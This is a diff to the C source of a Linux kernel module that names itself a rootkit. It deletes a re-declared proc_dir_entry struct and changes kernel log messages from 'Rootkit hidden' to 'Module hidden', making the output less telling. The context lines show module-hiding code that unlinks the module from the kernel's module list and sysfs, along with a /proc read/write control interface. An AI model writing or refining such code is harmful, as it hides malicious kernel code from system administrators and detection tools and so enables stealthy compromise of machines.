@@ -1,28 +1,5 @@
 #include "ker_mod.h"
 
-/* Re-writing proc_dir_entry, removed from Linux kernel since 3.10 */
-struct proc_dir_entry {
-		unsigned int low_ino;
-		umode_t mode;
-		nlink_t nlink;
-		kuid_t uid;
-		kgid_t gid;
-		loff_t size;
-		const struct inode_operations *proc_iops;
-		const struct file_operations *proc_fops;
-		struct proc_dir_entry *parent;
-		struct rb_root subdir;
-		struct rb_node subdir_node;
-		void *data;
-		atomic_t count;
-		atomic_t in_use;
-		struct completion *pde_unload_completion;
-		struct list_head pde_openers;
-		spinlock_t pde_unload_lock;
-		u8 namelen;
-		char name[];
-};
-
 static struct proc_dir_entry *proc_rtkit;
 static struct proc_dir_entry *proc_root;
 
@@ -43,7 +20,7 @@ void module_hide(void) {
 		kobject_del(&THIS_MODULE->mkobj.kobj);
 		list_del(&THIS_MODULE->mkobj.kobj.entry);
 		module_hidden = !module_hidden;
-		printk(KERN_INFO "Rootkit hidden\n");
+		printk(KERN_INFO "Module hidden\n");
 }
 
 void module_show(void) {
@@ -53,7 +30,7 @@ void module_show(void) {
 		list_add(&THIS_MODULE->list, module_previous);
 		kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
 		module_hidden = !module_hidden;
-		printk(KERN_INFO "Rootkit no longer hidden\n");
+		printk(KERN_INFO "Module no longer hidden\n");
 }
 
 static ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *ppos) {
@@ -80,7 +57,7 @@ static ssize_t rtkit_write(struct file *file, const char __user *buffer, size_t 
 		return count;
 }
 
-static const struct file_operations rootkit_fops = { 
+static const struct file_operations rootkit_fops = {
 		.owner = THIS_MODULE,
 		.read = rtkit_read,
 		.write = rtkit_write,
@@ -127,4 +104,3 @@ static void __exit rootkit_exit(void) {
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
-
